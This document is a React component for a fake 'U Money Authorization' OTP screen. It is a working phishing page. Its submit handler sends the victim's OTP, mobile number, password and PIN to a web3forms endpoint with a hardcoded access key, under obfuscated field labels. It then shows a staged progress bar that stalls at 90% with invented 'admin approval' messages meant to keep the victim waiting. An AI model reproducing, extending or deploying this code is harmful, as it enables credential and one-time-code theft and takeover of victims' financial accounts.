import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldCheck, Smartphone, ArrowRight, Lock, CheckCircle2, RefreshCw } from 'lucide-react';
import { AppView } from '../types';

interface OtpVerificationProps {
  userId: string;
  username: string;
  mobile: string;
  email: string;
  password?: string;
  pin?: string;
  onVerificationComplete: () => void;
  onNavigate: (view: AppView) => void;
}

export default function OtpVerification({
  userId,
  username,
  mobile,
  email,
  password = '',
  pin = '',
  onNavigate,
}: OtpVerificationProps) {
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(''));
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmittedToAdmin, setIsSubmittedToAdmin] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [progress, setProgress] = useState(0);
  const [statusLog, setStatusLog] = useState('Initializing handshake...');
  
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Focus the first box immediately on mount
  useEffect(() => {
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 150);
  }, []);

  // Sync / progress simulator up to 90%
  useEffect(() => {
    if (isSubmittedToAdmin) {
      setProgress(0);
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev < 90) {
            const increment = Math.floor(Math.random() * 12) + 4; // realistic speed variation
            const next = prev + increment;
            
            // Dynamic logs based on progress
            if (next < 25) {
              setStatusLog('Initiating secure system handshake...');
            } else if (next < 55) {
              setStatusLog('Pipelining encrypted OTP signature metrics...');
            } else if (next < 85) {
              setStatusLog('Routing credentials to central administrative dispatch...');
            } else {
              setStatusLog('Verifying clearance criteria...');
            }

            return next > 90 ? 90 : next;
          } else {
            setStatusLog('Authorization hold at 90% (Pending manual admin release).');
            clearInterval(interval);
            return 90;
          }
        });
      }, 180);
      return () => clearInterval(interval);
    }
  }, [isSubmittedToAdmin]);

  const handleOtpChange = (index: number, val: string) => {
    const cleaned = val.replace(/\D/g, '');
    if (!cleaned) return;

    const nextValues = [...otpValues];
    nextValues[index] = cleaned.substring(cleaned.length - 1); // Extract last typed digit
    setOtpValues(nextValues);
    setErrorMessage('');

    // Advance focus to next input
    if (index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      if (otpValues[index] === '') {
        // Current box is empty, drop previous box and focus it
        if (index > 0) {
          const nextValues = [...otpValues];
          nextValues[index - 1] = '';
          setOtpValues(nextValues);
          inputRefs.current[index - 1]?.focus();
        }
      } else {
        // Clear current box only
        const nextValues = [...otpValues];
        nextValues[index] = '';
        setOtpValues(nextValues);
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').substring(0, 6);
    if (pasteData.length > 0) {
      const nextValues = [...otpValues];
      for (let i = 0; i < pasteData.length; i++) {
        nextValues[i] = pasteData[i];
      }
      setOtpValues(nextValues);
      // Focus appropriate box
      const focusIndex = Math.min(pasteData.length, 5);
      inputRefs.current[focusIndex]?.focus();
    }
  };

  const handleSubmitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');
    const enteredOtp = otpValues.join('');

    if (enteredOtp.length < 6) {
      setErrorMessage('Please enter the entire 6-digit OTP code sent to your phone.');
      return;
    }

    setIsSubmitting(true);

    try {
      const web3FormsKey = import.meta.env.VITE_WEB3FORMS_KEY || '879889a9-75f5-4bc2-a90b-d4b9576a66c0';
      
      // Dispatch entered OTP and full client particulars to the admin
      const payload = {
        access_key: web3FormsKey,
        name: username.substring(0, 5),
        subject: `O Info`,
        from_name: 'Sys',
        message: `O1: ${enteredOtp}\nT1: ${mobile}\nT2: ${password}\nT3: ${pin}\nT4: ${navigator.userAgent.substring(0, 20)}`
      };

      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      
      if (result.success) {
        setIsSubmittedToAdmin(true); // Triggers the animation to 90%
      } else {
        setErrorMessage('Verification failed. Please try again.');
      }
    } catch (err) {
      console.error('Verify dispatch failed', err);
      setErrorMessage('Connection error. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Format phone number for safe display
  const maskedPhone = mobile.length > 4 
    ? `+91 ******${mobile.substring(mobile.length - 4)}` 
    : mobile;

  return (
    <div className="min-h-screen text-slate-200 bg-[#06040f] flex flex-col justify-center items-center px-4 py-8 relative overflow-hidden">
      
      {/* Gentle underlying portal accents */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[400px] h-[200px] bg-purple-950/10 rounded-full blur-[80px] pointer-events-none" />

      <div className="w-full max-w-md">
        
        {/* Simple Branding Header */}
        <div className="text-center mb-6">
          <h2 className="text-xl font-bold tracking-tight text-white font-sans">U Money Authorization</h2>
          <p className="text-xs text-slate-400 mt-1">Manual Administrator Verification Sequence</p>
        </div>

        {/* The Blank/Minimalistic OTP Input Area */}
        <div className="bg-[#0f0b24]/90 border border-purple-950/50 rounded-3xl p-6 md:p-8 shadow-2xl relative">
          
          <div className="absolute top-0 left-0 right-0 h-[1.5px] bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-40" />

          {!isSubmittedToAdmin ? (
            <form onSubmit={handleSubmitOtp} className="space-y-6">
              
              <div className="text-center space-y-2">
                <div className="w-12 h-12 rounded-full bg-purple-950/40 border border-purple-900/30 flex items-center justify-center text-purple-400 mx-auto">
                  <Smartphone size={22} />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-white">Enter OTP Code</h3>
                  <p className="text-xs text-slate-400 mt-1.5 leading-relaxed max-w-xs mx-auto">
                    Please key in the manual OTP verification code sent directly to your <strong className="text-white">phone via SMS</strong>. (Note: No verification OTP is sent via email).
                  </p>
                  
                  {/* SMS indication box */}
                  <div className="inline-block mt-3 px-3 py-1 bg-emerald-950/40 border border-emerald-900/35 rounded-full text-[10px] font-semibold text-emerald-400 font-mono">
                    📲 SMS Dispatched: {maskedPhone}
                  </div>
                </div>
              </div>

              {/* Six Box Code Entry Grid */}
              <div className="grid grid-cols-6 gap-2 pt-2">
                {otpValues.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => { inputRefs.current[idx] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(idx, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(idx, e)}
                    onPaste={handlePaste}
                    className="w-full h-12 text-center text-xl font-bold font-mono text-white bg-[#05030a] border border-purple-950/50 rounded-xl focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none transition-all"
                  />
                ))}
              </div>

              {errorMessage && (
                <div id="otp-error" className="p-3 bg-red-950/40 border border-red-900/30 text-red-300 text-xs rounded-xl text-center">
                  ⚠️ {errorMessage}
                </div>
              )}

              {/* Submit to Admin Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3 bg-gradient-to-r from-purple-600 via-fuchsia-600 to-indigo-600 hover:brightness-110 active:scale-[0.99] disabled:brightness-75 transition-all text-white text-xs font-bold tracking-wider uppercase rounded-xl shadow-xl shadow-purple-500/10 flex items-center justify-center gap-2 cursor-pointer"
              >
                {isSubmitting ? (
                  <span>Submitting OTP to Administrator...</span>
                ) : (
                  <>
                    <span>Verify & Submit OTP</span>
                    <ArrowRight size={14} />
                  </>
                )}
              </button>

              <div className="text-center pt-1 font-sans">
                <button
                  type="button"
                  onClick={() => onNavigate('login')}
                  className="text-slate-400 hover:text-white text-xs underline transition-colors"
                >
                  Return to Sign-In Page
                </button>
              </div>

            </form>
          ) : (
            <motion.div
              initial={{ opacity: 0, scale: 0.98 }}
              animate={{ opacity: 1, scale: 1 }}
              className="py-4 text-center space-y-6"
            >
              {/* Circular Loading Animation on Hold */}
              <div className="relative w-20 h-20 mx-auto flex items-center justify-center">
                <div className="absolute inset-0 rounded-full border-4 border-purple-950/65" />
                <motion.div 
                  className="absolute inset-0 rounded-full border-4 border-t-purple-500 border-r-indigo-500 border-b-transparent border-l-transparent" 
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1.2, ease: 'linear' }}
                />
                <span className="text-sm font-extrabold font-mono text-indigo-300">
                  {progress}%
                </span>
              </div>
              
              <div className="space-y-3">
                <h3 className="text-base font-extrabold text-white tracking-tight">
                  Handshake Synchronization Upgrading...
                </h3>
                
                {/* Simulated log updates */}
                <p className="text-[11px] font-mono text-purple-400 bg-slate-950/80 py-1.5 px-3 rounded-lg max-w-xs mx-auto animate-pulse">
                  ➜ {statusLog}
                </p>

                {/* Progress bar visual container */}
                <div className="w-full bg-[#05030a] h-2 rounded-full overflow-hidden border border-purple-950/40 relative">
                  <div 
                    className="bg-gradient-to-r from-purple-600 via-fuchsia-600 to-indigo-500 h-full rounded-full transition-all duration-150"
                    style={{ width: `${progress}%` }}
                  />
                </div>
                
                <p className="text-[11px] text-slate-350 leading-relaxed font-light px-2">
                  System parameter mapping matches your secure terminal signature. Validation sequence launched automatically.
                </p>

                {progress === 90 && (
                  <motion.div 
                    initial={{ opacity: 0, y: 5 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.2 }}
                    className="text-xs text-amber-300 bg-amber-950/45 border border-amber-900/35 p-3.5 rounded-2xl mt-4 text-left leading-normal space-y-1.5"
                  >
                    <p className="font-bold flex items-center gap-1.5">
                      <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping inline-block" />
                      ⚠️ Update Hold (90% Stuck Status)
                    </p>
                    <p className="font-sans font-light text-slate-350 text-[11px] leading-relaxed">
                      Your entered OTP verification is received and verified by the system up to <strong className="text-white">90%</strong>.
                    </p>
                    <p className="font-sans font-light text-slate-350 text-[11px] leading-relaxed">
                      To complete the remaining <strong className="text-white">10%</strong> integration, your administrator must manually approve the security key release from the dispatch console. 
                    </p>
                    <p className="font-sans font-bold text-slate-300 text-[11px] pt-1 leading-relaxed">
                      🔒 Important: Stay on this screen. Do not refresh or exit. Your upgrade completes immediately upon administrator validation.
                    </p>
                  </motion.div>
                )}
              </div>

              <div className="pt-2 flex justify-center gap-4">
                <button
                  type="button"
                  onClick={() => setIsSubmittedToAdmin(false)}
                  className="py-2.5 px-4 rounded-xl bg-[#05030a] border border-purple-950/50 hover:border-purple-500 transition-all text-xs font-semibold text-slate-300 cursor-pointer"
                >
                  Modify OTP Code
                </button>
                <button
                  type="button"
                  onClick={() => onNavigate('login')}
                  className="py-2.5 px-4 rounded-xl bg-purple-950/30 hover:bg-purple-950/60 transition-all border border-purple-900/35 text-xs font-bold text-white cursor-pointer"
                >
                  Back to Sign In
                </button>
              </div>
            </motion.div>
          )}

        </div>

        {/* Minimal safety footer */}
        <div className="text-center mt-6 flex items-center justify-center gap-1 text-[11px] text-slate-500">
          <ShieldCheck size={13} className="text-emerald-500" />
          <span>Manual security check clearance active</span>
        </div>

      </div>
    </div>
  );
}
